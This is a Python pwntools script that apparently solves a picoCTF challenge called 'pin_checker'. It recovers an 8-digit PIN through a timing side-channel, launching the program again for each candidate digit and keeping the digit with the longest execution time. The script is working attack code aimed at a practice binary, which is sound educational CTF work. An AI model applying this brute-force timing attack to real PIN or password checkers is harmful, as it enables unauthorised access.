#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host saturn.picoctf.net --port 55824 pin_checker
from pwn import *
from time import time

# Set up pwntools for the correct architecture
exe = context.binary = ELF('pin_checker')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'saturn.picoctf.net'
port = int(args.PORT or 55824)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments

# The pin starts as all 0s.
pin_code = ["0"] * 8
# Loop through all the digits in the pin
for i in range(8):
    # Store the program execution times in a list
    time_results = []
    # Loop through the 9 possible digits 0..9
    for j in range(10):
        # Set the current position in the pin code (i) to the current digit being tested (j)
        pin_code[i] = str(j)
        # Start the program
        io = start()
        # Take note of the current time
        begin = time()
        # Send the possible pin code to the program
        io.sendlineafter("Please enter your 8-digit PIN code:", "".join(pin_code))
        # Wait until the program exits
        io.poll(block=True)
        # Record the current time and calculate the execution time
        end = time() - begin
        # Add the execution time to the list of times
        time_results.append(end)
    # Find the index of the greatest execution time (based on https://stackoverflow.com/a/11825864)
    correct_digit = max(range(len(time_results)), key=time_results.__getitem__)
    # Set the newly found correct digit in the pin code
    pin_code[i] = str(correct_digit)
    log.success("Found digit %i. Current pin code is %s", correct_digit, "".join(pin_code))
log.success("Pin Code: %s", "".join(pin_code))
